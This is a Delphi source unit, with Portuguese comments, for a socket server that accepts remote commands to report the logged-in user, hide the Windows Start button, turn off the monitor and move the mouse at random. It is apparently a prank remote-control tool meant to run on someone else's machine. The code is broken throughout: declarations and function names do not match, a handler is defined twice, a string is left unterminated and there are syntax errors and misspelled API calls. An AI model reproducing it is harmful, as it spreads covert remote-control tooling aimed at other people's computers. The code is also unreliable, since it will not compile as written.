unit UServer;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.FileCtrl,
  System.Win.ScktComp, Vcl.ExtCtrls;

type
  TFrmSGRPCServer = class(TForm)
    MouseTimer: TTimer;
    ServerSocket: TServerSocket;
    Info: TMemo;
    DirectoryListBox: TDirectoryListBox;
    DriveComboBox: TDriveComboBox;
    FileListBox: TFileListBox;
    procedure FormCreate(Sender: TObject);
    procedure ServerSocketAccept(Sender: TObject; Socket: TCustomWinSocket);
    procedure ServerSocketClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerSocketClientRead(Sender: TObject; Socket: TCustomWinSocket);
  private
    { Private declarations }
  public
    { Public declarations }

    procedure AppException(Sender: TObject; E: Exception);
    end;

    Function LogUser: String;
    Function EstadoServido: String;
    Function BoataoIniciar: String;
    Function KillMonito: String;
    Function PegaRato: String;

var
  FrmSGRPCServer: TFrmSGRPCServer;
  FrmSGRPCServer: TFrmSGRPCServer;
  VTeclasAtivas: Boolean = True;
  VBootWindows: Boolean = True;
  VIniciarVisible: Boolean = True;
  VMouse: Boolean = False;
  VBotaoMouse: Boolean = False;

implementation

{$R *.dfm}

{FUNCOES DE CONTROLE DE SISTEMA}
{
function TFrmSGRPCServer.LogUser: String;
var Registro: TRegistry;
begin
  Try
    Registro := TRegistry.Create;
    Registro.RootKey := HKEY_LOCAL_MACHINE;
    Registro.OpenKey('Network\Logon', false);
    Result := 'Usu�rio logado no sistema: ' + Registro.ReadString('username');
    Registro.Free;
  Except
    Result := 'N�o foi poss�vel recuperar nome do us�rio logado!'
  End;
end;
}

function TFrmSGRPCServer.LogUser: String;
var
  User: Array[0..254] of Char;
  Size:Cardinal;
begin
  Size:=255;
  If(GetUserName(User, Size)) Then
      Result := 'Usu�rio logado no sistema: ' + User
  else
    Result := 'N�o foi poss�vel resolver nome do usu�rio logado no sistema!'
end;

function TFrmSGRPCServer.EstadoServidor: String;
begin
  If(VBootWindows) Then
    Result := 'Anti - Boot Desativado!' + #13;
  else
    Result := 'Anti - Boot ativado!' + #13;

  If(VIniciarVisible) Then
    Result := Result + 'Bot�o INICIAR vis�vel' + #13;
  else
    Result := Result + 'Bot�o INICIAR Invis�vel' + #13;

  If(VMouse) Then
    Result := Result + 'Movimento aleat�rio do Mouse ativado!' + #13;
  else
    Result := Result + 'Movimento aleat�rio do Mouse desativado!' + #13;

  If(VBotaoMouse) Then
    Result := Result + 'Bot�es do Mouse Alterados!' + #13;
  else
    Result := Result + 'Bot�es do Mouse em Estado Padr�o!' + #13;

  If(VTeclasAtivas) Then
    Result := Result + 'Teclas do sistema Ativas!' + #13;
  else
    Result := Result + 'Teclas do sistema Desativadas!' + #13;
end;

function TFrmSGRPCServer.BotaoIniciar: String;
Var
  TaskBarHandle, ButtonHandle: HWND;
begin
  TaskBarHandle := FindWindow('Shell_TrayWnd', nil);
  ButtonHandle := GetWindow(TaskBarHandle, GW_CHILD);

  If Not(VIniciarVisible) Then
    begin
      ShowWindow(ButtonHandle, SW_RESTORE);
      VIniciarVisible := True;
      Result := 'Bot�o INICIAR do Windows vis�vel!
    end;
  else
    begin
      ShowWindow(ButtonHandle, SW_HIDE);
      VIniciarVisible := False;
      Result := 'Bot�o INICIAR do Windows Invis�vel!'
    end;
end;

function TFrmSGRPCServer.KillMonitor: String;
begin
  SendMessage(Application.Handle, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
  Result := 'Monitor desativado!';
end;

function TFrmSGRPCServer.PegaRato: String;
begin
  If(VMouse) Then
    Begin
      MouseTimer.Enable := False;
      Vmouse := False;
      Result := 'Movimentos aleat�rios do Mouse cancelado!'
    End;
  Else
    begin
      MouseTimer.Enable := True;
      VMouse := True;
      Result := 'Movimentos aleat�rios do Mouse ativado!'
    end;
end;

procedure TFrmSGRPCServer.MouseTimerTimer (Sender: TObject);
var
PT: TPoint;
begin
    GetCursosPos(PT);
    PT.X := PT.X + 3;
    PT.Y := PT.Y + 3;
    if PT.X >= Screen.Width-1 then
    PT.x := 0;
    if PT.Y >= Screen.Height-1 then
    PT.y := 0
    SetCursorPos(PT.X, PT.Y)
end;

procedure TFrmSGRPCServer.ServerSocketClientRead(Sender: TObject; Socket:
CustomWinSocket);
var
  MSG, Parametro: string;
begin
  {Recebemos a string}
  MSG := Socket.ReceiveText;
  {Inserimos no LOG}
  Info.Lines.Add(Socket.RemoteAddress + ' - ' + MSG);
  {Extrai parametros se houver (todos os comandos t�m 5 caracteres)}
  Parametro := Copy (MSG, 6, Length (MSG) - 5);

  {Executa compara��es de String para chamar fun��es}
  If(Pos('User!', MSG)=1) Then
    Socket.SendText('TEXT!TEXT!' + LogUser)
  else
    If(Pos('?Ser!', MSG)=1) Then
      Socket.SendText('TEXT!TEXT!' + EstadoServidor)
  else
    If(Pos('HIni!', MSG)=1) Then
      Socket.SendText('TEXT!TEXT!' + BotaoIniciar)
  else
    If(Pos('KMon!', MSG)=1) Then
      Socket.SendText('TEXT!TEXT!' + KillMonitor)
  else
    If(Pos('CRat!', MSG)=1) Then
      Socket.SendText('TEXT!TEXT!' + PegaRato)
  else
    {Se chegar at� aqui, comando desconhecido}
    Socket.SendText('TEXT!TEXT!Comando n�o identificado!')
end;

{FIM FUNCOES DE CONTROLE DE SISTEMA}

procedure TFrmSGRPCServer.AppException(Sender: TObject; E: Exception);
begin
     Info.Lines.Add('Erro no sistema da classe ' + E.ClassName);
     Info.Lines.Add('Mensagem: ' + E.Message)
end;

procedure TFrmSGRPCServer.FormCreate(Sender: TObject);
begin
  ServerSocket.Active:=True;
  Application.OnException:=AppException
end;

procedure TFrmSGRPCServer.ServerSocketAccept(Sender: TObject; Socket: TCustomWinSocket);
begin
  Info.Lines.Add(Socket.RemoteAddress+'conectado!');
  Socket.SendText('Text!Text!Voc� est� conectado. Seja bem vino e divirta-se!')
end;

procedure TFrmSGRPCServer.ServerSocketClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  Info.Lines.Add(Socket.RemoteAddress+'desconectado!')
end;



procedure TFrmSGRPCServer.ServerSocketClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
var
  Msg:String;
begin
  Msg:=Socket.ReceiveText;
  Info.Lines.Add(Socket.RemoteAddress+' - ' + Msg)
end;

end.
